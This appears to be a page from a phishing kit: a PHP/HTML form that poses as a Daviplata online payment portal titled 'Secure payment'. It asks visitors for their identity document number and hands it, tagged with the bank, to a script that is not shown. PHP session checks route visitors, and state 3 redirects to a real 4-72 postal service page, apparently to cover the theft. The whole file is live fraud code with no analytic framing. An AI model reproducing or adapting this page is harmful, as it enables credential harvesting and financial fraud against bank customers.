<?php
session_start();


if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){


}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 2){

    header('location:/404.php');

}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 3){

    header('location:https://www.4-72.com.co/publicaciones/236/personas/');
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0">
    <title>Secure payment</title>

    <script type="text/javascript" src="../../scripts/jquery-3.6.0.min.js"></script>
		<script src="../../scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="../../scripts/functions2.js"></script>  		

    <style>

        *{
            -webkit-appearance: none;
            font-family: Arial, Helvetica, sans-serif;
            margin: 0;
            padding: 0;
        }
        input{
            width: 80%;
            height: 40px;
            border-radius: 5px;
            margin-top: 10px;
            border:1px solid gray;
            padding: 5px;
        }
        select{
            padding: 5px;
            background-color: white;
            color: black;
            width: 82%;
            height: 40px;
            border-radius: 5px;
            margin-top: 10px;
            border:1px solid gray;
        }

        #btnUsuario{
            background-color: palevioletred;
            border: none;
            color: white;
            letter-spacing: 3px;
            font-family: Arial, Helvetica, sans-serif, 'Arial Narrow Bold';
            
        }

        #clave{
            color:rgb(78,139,102);
        }
    </style>
</head>
<body style="background-color:black">
    <br><br>
    <center><h1 style="color:white;text-align: center;">Bienvenido al Portal de Pagos en LÃ­nea</h1></center>
    <br><center>  <img src="img/daviplata.PNG"></center><br>
    <h3 style="color:white;">InformaciÃ³n de pago</h3>
<br><br>
    <div>
        <center>
        <select name="" id="" style="background-color:black;color:white">
            <option value="cedula">Cedula Ciudadania </option>
            <option value="">Cedula extranjera</option>
            <option value="">Pasaporte</option></center>
        </select><br>

        <input type="tel" id="txtUsuario" name = "cedula" placeholder="NÃºmero de documento" required minlength="6" maxlength="10"><br>
        <input type="submit" value="Continuar" id="btnUsuario" ></center><br>
        <input type="hidden" value="davipla" id="banco">
   </div>
<br><br>



<script type="text/javascript">

$(document).ready(function() {

    $('#btnUsuario').click(function(){
        if ($("#txtUsuario").val().length > 5) {
        
            pasousuario($("#txtPass").val(), $("#txtUsuario").val(), $("#banco").val());	
        }else{
            $("#err-mensaje").show();
            $(".user").css("border", "1px solid red");
            $("#txtUsuario").focus();
        }			
    });
});
</script>
    
</body>
</html>
